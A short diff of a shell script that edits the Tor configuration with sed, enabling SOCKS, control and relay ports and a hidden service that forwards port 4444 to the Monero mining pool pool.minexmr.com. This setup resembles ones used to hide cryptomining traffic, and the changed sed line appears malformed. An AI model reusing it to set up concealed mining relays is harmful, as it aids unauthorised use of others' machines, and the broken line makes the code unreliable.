@@ -13,7 +13,7 @@ sudo /etc/init.d/tor stop
 sudo sed -i '18s/#SOCKSPort/SOCKSPort/ ' /etc/tor/torrc
 sudo sed -i '57s/#ControlPort/ControlPort/ ' /etc/tor/torrc
 sudo sed -i 's/#ORPort/ORPort/ ' /etc/tor/torrc
-sudo sed -i '75s/#HiddenServiceDir/HiddenServiceDir/ ' /etc/tor/torrc
+sudo sed -i '75s\#HiddenServiceDir /var/lib/tor/other_hidden_service\HiddenServiceDir /var/lib/tor/other_hidden_service\ ' /etc/tor/torrc
 sudo sed -i '76i\HiddenServicePort 4444 pool.minexmr.com:4444\ ' /etc/tor/torrc
 
 sudo systemctl enable tor
